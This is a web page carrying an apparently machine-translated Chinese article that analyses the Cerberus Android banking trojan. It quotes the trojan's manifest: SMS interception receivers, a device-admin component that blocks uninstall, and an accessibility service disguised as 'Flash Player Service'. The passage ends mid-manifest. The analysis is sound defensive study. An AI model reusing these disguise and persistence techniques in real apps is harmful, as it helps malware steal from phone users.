<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🏪 🌷 💆 探索适用于Android的现代恶意软件Cerberus 🎓 🍋 🕟</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="从2020年开始，到今天，我们已经有了Android 9.0版Pie，Google在胸口跳动并说他们的产品受到保护。 但是反派不会睡觉，不会为Android创建自己的恶意软件。 

 随机地，我遇到了一个模糊的apk文件，这是一种名为“ Cerberus”的银行业恶意软件，它于2019年出现。 

...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>探索适用于Android的现代恶意软件Cerberus</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/459858/"><img src="https://habrastorage.org/getpro/habr/post_images/5fb/391/192/5fb39119247d45dfa979392da83f34f1.png" alt="图片"><br><br> 从2020年开始，到今天，我们已经有了Android 9.0版Pie，Google在胸口跳动并说他们的产品受到保护。 但是反派不会睡觉，不会为Android创建自己的恶意软件。 <br><br> 随机地，我遇到了一个模糊的apk文件，这是一种名为“ Cerberus”的银行业恶意软件，它于2019年出现。 <br><br> 该僵尸网络的APK文件使用无效的服务器连接地址传给我，因此，该僵尸网络使用“模块化”系统并直接从其服务器加载功能，因此部分工作逻辑和功能仍未得到开发。 <br><a name="habracut"></a><br><h2> 分析apk包 </h2><br> 在分析了apk包之后，我编译了Trojan程序的结构： <br><br><ol><li> 接收器，自动运行+报警； </li><li> 服务，以8秒为周期运行，它负责显示弹出消息以启用辅助功能，激活屏幕锁定功能和禁用管理员权限； </li><li> 服务，从设备的传感器收集数据，因此恶意软件收到了设备的物理活动； </li><li> 服务，周期性地锁定设备屏幕； </li><li> 服务，负责与服务器交换数据； </li><li> 活动，将HTML代码加载到WebView中，并显示内容，以代替银行应用程序的活动； </li><li> 活动，请求危险的权限。 </li><li> 类，本身存储项目的主线（字符串） </li></ol><br><h2> 让我们从清单开始 </h2><br> 该应用程序的清单很有趣，您已经可以从中确定这不是简单的应用程序，而是普通的恶意软件。 <br><br> 例如，考虑对应用程序的权限： <br><br><pre><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.RECEIVE_BOOT_COMPLETED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_PHONE_STATE"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.CALL_PHONE"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_CONTACTS"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_SMS"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.INTERNET"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.WAKE_LOCK"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.SEND_SMS"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.RECEIVE_SMS"</span></span></span><span class="hljs-tag">/&gt;</span></span></code> </pre> <br> 在这里，您可以看到该应用程序可以访问SMS，联系人，电话，互联网，并且该应用程序处于睡眠模式。 <br><br> 我们走得更远，看到特权使该应用程序成为接收/发送SMS的主要功能，这是用来在受害者电话上隐藏SMS消息的恶棍。 <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iExuCRAHNmEv"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:scheme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"sms"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.SENDTO"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:scheme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"smsto"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.SEND"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.lThcZejcCFe"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BROADCAST_WAP_PUSH"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:mimeType</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"application/vnd.wap.mms-message"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.provider.Telephony.WAP_PUSH_DELIVER"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.UwLgqh"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.SEND_RESPOND_VIA_MESSAGE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:scheme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"sms"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.RESPOND_VIA_MESSAGE"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:scheme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"smsto"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br> 当然，Receiver可以自动启动服务并拦截SMS。 <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.wtawxrmdzej.oClFeoEgobr"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BROADCAST_SMS"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:priority</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"979"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.QUICKBOOT_POWERON"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.htc.intent.action.QUICKBOOT_POWERON"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.PACKAGE_ADDED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.USER_PRESENT"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.PACKAGE_REMOVED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.provider.Telephony.SMS_RECEIVED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.provider.Telephony.SMS_DELIVER"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.BOOT_COMPLETED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br> 管理员权限，这已经更加有趣了。 应用程序需要它们阻止删除应用程序（启用管理员权限，该应用程序将根本没有“删除”按钮），并且这些权限将允许您从设备中删除所有内容并阻止设备。 <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:theme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@style/Theme.NoDisplay"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">""</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.hwefoncq.ZQoykALT"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:excludeFromRecents</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"System Driver"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.hwefoncq.LuMBTH"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_DEVICE_ADMIN"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.app.device_admin"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/ypqvk"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:priority</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"121"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.app.action.DEVICE_ADMIN_ENABLED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.app.action.DEVICE_ADMIN_DISABLED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br> 好吧，最有趣的是可访问性服务。 它用于使恶意软件可以单击屏幕本身，并为其自身提供必要的权限，包括管理员权限。 通过此权限，攻击者可以监视设备上的所有用户操作。 <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Flash Player Service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.BEUZLDTj"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_ACCESSIBILITY_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.accessibilityservice.AccessibilityService"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.accessibilityservice"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/ikxclmrgfqap"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br> 好吧，如果没有有效的Malvari服务器地址，其余的服务和活动就没什么用了。 <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"mhudtqw"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.wsdckwoau"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.coimtetkf"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span 